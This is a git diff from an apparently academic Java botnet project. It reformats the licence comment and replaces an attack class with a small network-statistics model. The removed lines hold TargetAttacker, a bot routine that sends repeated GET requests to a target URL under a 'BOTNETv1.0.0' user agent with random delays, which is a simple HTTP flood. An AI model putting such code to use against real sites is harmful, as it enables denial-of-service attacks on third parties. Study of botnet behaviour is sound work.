@@ -1,20 +1,20 @@
 /**
  * The MIT License (MIT)
- *
+ * <p>
  * Copyright (c) 2016 Giacomo Marciani, Michele Porretta
- *
+ * <p>
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
  * in the Software without restriction, including without limitation the rights
  * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  * copies of the Software, and to permit persons to whom the Software is
  * furnished to do so, subject to the following conditions:
- *
- *
+ * <p>
+ * <p>
  * The above copyright notice and this permission notice shall be included in
  * all copies or substantial portions of the Software.
- *
- *
+ * <p>
+ * <p>
  * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
@@ -24,56 +24,25 @@
  * THE SOFTWARE.
  */
 
-package com.giammp.botnet.control;
+package com.giammp.botnet.model;
 
-import com.giammp.botnet.model.Target;
-import com.giammp.botnet.tools.RandomTools;
+import lombok.AllArgsConstructor;
 import lombok.Data;
-
-import java.io.IOException;
-import java.net.*;
-import java.util.Random;
+import lombok.NoArgsConstructor;
 
 /**
- * This class realizes the runnable that performs the GET attack.
+ * This class realizes the model fo network statistics.
  *
  * @author Giacomo Marciani <gmarciani@ieee.org>
  * @author Michele Porretta <mporretta@acm.org>
  * @since 1.0.0
- * @see Target
+ * @see SysInfo
+ * @see NetInfo
+ * @see SysStat
  */
 @Data
-public class TargetAttacker implements Runnable {
-  private final Target target;
-  private Random rnd = new Random();
-
-  @Override
-  public void run() {
-    Target tgt = this.getTarget();
-    int i = 0;
-    for (i = 0; i < tgt.getMaxAttempts(); i++) {
-      try {
-        this.makeGetRequest(tgt.getUrl());
-      } catch (IOException e) {
-        e.printStackTrace();
-        return;
-      }
-      int millis = RandomTools.getRandomInt(tgt.getTimeMin(), tgt.getTimeMax(), this.getRnd());
-      try {
-        Thread.sleep(millis);
-      } catch (InterruptedException e) {
-        e.printStackTrace();
-      }
-    }
-  }
-
-  private void makeGetRequest(final String address) throws IOException {
-    URL url = new URL(address);
-    HttpURLConnection http = (HttpURLConnection) url.openConnection();
-    http.setRequestMethod("GET");
-    http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
-    int response = http.getResponseCode();
-    System.out.format("[BOT]> GET %s :: %d\n", url, response);
-  }
-
+@AllArgsConstructor
+@NoArgsConstructor
+public class NetStat {
+  private long uptime;
 }
